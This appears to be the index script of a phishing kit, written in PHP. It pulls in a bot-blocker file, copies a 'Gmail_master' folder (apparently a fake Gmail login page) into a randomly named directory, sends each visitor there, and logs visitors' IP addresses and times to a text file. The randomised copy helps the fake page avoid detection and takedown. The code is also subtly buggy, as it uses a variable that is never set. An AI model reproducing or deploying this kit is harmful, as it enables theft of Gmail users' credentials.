<?

include('blocker.php');
$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
$dir = opendir($Gmail_master);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($Gmail_master . '/' . $file) ) {
recurse_copy($Gmail_master . '/' . $file,$DIR . '/' . $file);
}
else {
copy($Gmail_master . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="Gmail_master";
recurse_copy( $Gmail_master, $DIR );
header("location:$DIR");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?> 
